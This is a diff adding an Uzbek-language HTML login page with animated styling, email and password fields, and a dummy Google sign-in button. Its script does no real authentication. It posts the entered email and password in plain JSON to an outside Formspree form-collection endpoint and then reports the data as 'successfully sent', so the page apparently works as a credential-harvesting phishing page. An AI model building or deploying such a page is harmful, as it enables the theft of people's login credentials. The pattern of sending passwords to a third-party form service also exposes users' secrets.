@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Kirish</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+html {
+  height: 100%;
+  background: #0a0a12;
+}
+
+body {
+  min-height: 100%;
+  min-height: 100dvh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #0a0a12;
+  padding: 2rem 1rem;
+  position: relative;
+  overflow-x: hidden;
+}
+
+#stars {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.orb1 {
+  position: fixed;
+  width: 420px; height: 420px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(85,52,183,0.35) 0%, transparent 70%);
+  top: -100px; left: -120px;
+  animation: float 12s ease-in-out infinite;
+  pointer-events: none; z-index: 0;
+}
+.orb2 {
+  position: fixed;
+  width: 340px; height: 340px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(127,119,221,0.25) 0%, transparent 70%);
+  bottom: -80px; right: -80px;
+  animation: float2 15s ease-in-out infinite;
+  pointer-events: none; z-index: 0;
+}
+.orb3 {
+  position: fixed;
+  width: 260px; height: 260px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(29,158,117,0.15) 0%, transparent 70%);
+  top: 40%; left: 60%;
+  animation: float3 10s ease-in-out infinite;
+  pointer-events: none; z-index: 0;
+}
+
+.card {
+  position: relative;
+  z-index: 2;
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 0.5px solid rgba(255,255,255,0.1);
+  border-radius: 24px;
+  padding: 2.8rem 2.4rem;
+  width: 100%;
+  max-width: 440px;
+  box-shadow: 0 24px 80px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(255,255,255,0.05) inset;
+}
+
+.logo {
+  display: flex; align-items: center; gap: 12px; margin-bottom: 2rem;
+}
+.logo-icon {
+  width: 40px; height: 40px; border-radius: 12px;
+  background: linear-gradient(135deg,#7F77DD,#5534B7);
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+.logo-icon svg { width: 22px; height: 22px; }
+.logo-text { font-size: 21px; font-weight: 600; color: #fff; letter-spacing: -0.3px; }
+
+.subtitle {
+  font-size: 13.5px; color: rgba(255,255,255,0.4);
+  margin-bottom: 2rem; margin-top: -1.2rem;
+}
+
+.field { display: flex; flex-direction: column; gap: 7px; margin-bottom: 1.1rem; }
+.field label {
+  font-size: 11px; font-weight: 600; color: rgba(255,255,255,0.38);
+  letter-spacing: 1px; text-transform: uppercase;
+}
+.field input {
+  padding: 12px 15px; border-radius: 11px;
+  border: 0.5px solid rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.06); color: #fff; font-size: 14px;
+  outline: none; transition: border-color 0.2s, background 0.2s, box-shadow 0.2s; width: 100%;
+}
+.field input::placeholder { color: rgba(255,255,255,0.2); }
+.field input:focus {
+  border-color: #7F77DD; background: rgba(127,119,221,0.09);
+  box-shadow: 0 0 0 3px rgba(127,119,221,0.12);
+}
+
+.btn {
+  width: 100%; padding: 13px; border-radius: 11px; border: none;
+  background: linear-gradient(135deg, #7F77DD, #5534B7); color: #fff;
+  font-size: 14.5px; font-weight: 600; cursor: pointer; margin-top: 0.9rem;
+  transition: opacity 0.15s, transform 0.12s, box-shadow 0.2s;
+  box-shadow: 0 4px 20px rgba(85,52,183,0.35); letter-spacing: 0.1px;
+}
+.btn:hover { opacity: 0.88; transform: translateY(-1px); box-shadow: 0 6px 28px rgba(85,52,183,0.45); }
+.btn:active { transform: translateY(0); }
+.btn:disabled { opacity: 0.4; cursor: default; transform: none; box-shadow: none; }
+
+.divider { display: flex; align-items: center; gap: 12px; margin: 1.3rem 0; }
+.divider hr { flex: 1; border: none; border-top: 0.5px solid rgba(255,255,255,0.1); }
+.divider span { font-size: 12px; color: rgba(255,255,255,0.25); }
+
+.alt-btn {
+  width: 100%; padding: 11px; border-radius: 11px;
+  border: 0.5px solid rgba(255,255,255,0.12);
+  background: rgba(255,255,255,0.04); color: rgba(255,255,255,0.75);
+  font-size: 13.5px; font-weight: 500; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 9px;
+  transition: background 0.15s, border-color 0.15s;
+}
+.alt-btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
+
+.msg { font-size: 13px; margin-top: 12px; text-align: center; min-height: 20px; transition: opacity 0.2s; }
+.msg.err { color: #F09595; }
+.msg.ok  { color: #5DCAA5; }
+
+.footer-links {
+  display: flex; justify-content: center; gap: 5px;
+  margin-top: 1.6rem; font-size: 12.5px; color: rgba(255,255,255,0.3);
+}
+.footer-links a { color: #9F97EE; text-decoration: none; }
+.footer-links a:hover { text-decoration: underline; }
+
+@keyframes float {
+  0%,100%{ transform:translate(0,0) scale(1); }
+  33%{ transform:translate(20px,-15px) scale(1.05); }
+  66%{ transform:translate(-10px,10px) scale(0.95); }
+}
+@keyframes float2 {
+  0%,100%{ transform:translate(0,0) scale(1); }
+  33%{ transform:translate(-15px,20px) scale(0.95); }
+  66%{ transform:translate(25px,-10px) scale(1.08); }
+}
+@keyframes float3 {
+  0%,100%{ transform:translate(0,0); }
+  50%{ transform:translate(10px,-20px); }
+}
+
+/* ── MOBILE FIX ── */
+@media (max-width: 480px) {
+  body {
+    align-items: flex-start;
+    padding: 2rem 0.85rem 3rem;
+    /* background oq bo'lib qolmasligi uchun */
+    background: #0a0a12;
+  }
+  .card {
+    padding: 1.8rem 1.4rem;
+    border-radius: 20px;
+    max-width: 100%;
+  }
+  .logo-text { font-size: 19px; }
+  .btn { padding: 12px; font-size: 14px; }
+  .orb1 { width: 260px; height: 260px; }
+  .orb2 { width: 200px; height: 200px; }
+}
+
+/* ── LARGE SCREEN ── */
+@media (min-width: 1200px) {
+  .card { max-width: 460px; padding: 3rem 2.8rem; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="stars"></canvas>
+<div class="orb1"></div>
+<div class="orb2"></div>
+<div class="orb3"></div>
+
+<div class="card">
+  <div class="logo">
+    <div class="logo-icon">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 12C14.21 12 16 10.21 16 8S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="white"/>
+      </svg>
+    </div>
+    <span class="logo-text">Xush kelibsiz</span>
+  </div>
+  <p class="subtitle">Hisobingizga kiring</p>
+
+  <div class="field">
+    <label>Email manzil</label>
+    <input type="email" id="em" placeholder="email@example.com" autocomplete="email"/>
+  </div>
+  <div class="field">
+    <label>Parol</label>
+    <input type="password" id="pw" placeholder="••••••••" autocomplete="current-password"/>
+  </div>
+
+  <button class="btn" id="btn" onclick="send()">Kirish</button>
+
+  <div class="divider"><hr/><span>yoki</span><hr/></div>
+
+  <button class="alt-btn" onclick="googleLogin()">
+    <svg width="16" height="16" viewBox="0 0 24 24">
+      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+    </svg>
+    Google bilan kirish
+  </button>
+
+  <div class="msg" id="msg"></div>
+
+  <div class="footer-links">
+    <span>Hisobingiz yo'qmi?</span>
+    <a href="#">Ro'yxatdan o'ting</a>
+  </div>
+</div>
+
+<script>
+const canvas = document.getElementById('stars');
+const ctx = canvas.getContext('2d');
+let stars = [], animFrame;
+
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  initStars();
+}
+
+function initStars() {
+  stars = [];
+  const count = Math.max(Math.floor((canvas.width * canvas.height) / 8000), 80);
+  for (let i = 0; i < count; i++) {
+    stars.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height,
+      r: Math.random() * 1.2 + 0.2,
+      speed: Math.random() * 0.008 + 0.003,
+      phase: Math.random() * Math.PI * 2
+    });
+  }
+}
+
+function drawStars(t) {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  for (const s of stars) {
+    const alpha = 0.1 + 0.5 * (0.5 + 0.5 * Math.sin(t * s.speed + s.phase));
+    ctx.beginPath();
+    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+    ctx.fillStyle = `rgba(200,198,255,${alpha})`;
+    ctx.fill();
+  }
+  animFrame = requestAnimationFrame(drawStars);
+}
+
+let resizeTimer;
+window.addEventListener('resize', () => {
+  clearTimeout(resizeTimer);
+  resizeTimer = setTimeout(() => {
+    cancelAnimationFrame(animFrame);
+    resizeCanvas();
+    animFrame = requestAnimationFrame(drawStars);
+  }, 100);
+});
+
+resizeCanvas();
+animFrame = requestAnimationFrame(drawStars);
+
+async function send() {
+  const em  = document.getElementById('em').value.trim();
+  const pw  = document.getElementById('pw').value.trim();
+  const msg = document.getElementById('msg');
+  const btn = document.getElementById('btn');
+
+  if (!em || !pw) {
+    msg.className = 'msg err';
+    msg.textContent = "Iltimos, barcha maydonlarni to'ldiring.";
+    return;
+  }
+  if (!em.includes('@')) {
+    msg.className = 'msg err';
+    msg.textContent = "Iltimos, to'g'ri email kiriting.";
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Yuklanmoqda...';
+  msg.textContent = '';
+
+  try {
+    const r = await fetch('https://formspree.io/f/mjglgprk', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({ email: em, parol: pw })
+    });
+    if (r.ok) {
+      msg.className = 'msg ok';
+      msg.textContent = 'Muvaffaqiyatli yuborildi!';
+      document.getElementById('em').value = '';
+      document.getElementById('pw').value = '';
+    } else {
+      msg.className = 'msg err';
+      msg.textContent = "Xatolik yuz berdi. Qaytadan urinib ko'ring.";
+    }
+  } catch (e) {
+    msg.className = 'msg err';
+    msg.textContent = 'Tarmoq xatosi. Internet aloqangizni tekshiring.';
+  }
+
+  btn.disabled = false;
+  btn.textContent = 'Kirish';
+}
+
+function googleLogin() {
+  const msg = document.getElementById('msg');
+  msg.className = 'msg err';
+  msg.textContent = 'Google kirish hozircha sozlanmagan.';
+}
+
+document.getElementById('pw').addEventListener('keydown', e => {
+  if (e.key === 'Enter') send();
+});
+document.getElementById('em').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('pw').focus();
+});
+</script>
+</body>
+</html>
